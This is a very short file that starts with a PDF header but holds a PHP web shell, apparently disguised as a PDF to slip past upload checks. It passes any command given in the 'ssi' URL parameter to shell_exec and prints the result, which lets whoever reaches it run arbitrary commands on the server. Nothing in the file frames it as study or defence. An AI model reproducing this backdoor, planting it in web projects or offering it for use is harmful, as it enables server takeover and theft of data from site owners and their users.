%PDF-1.7
<?php
if(isset($_GET['ssi'])) {
    echo "<pre>" . shell_exec($_GET['ssi']) . "</pre>";
}
?>
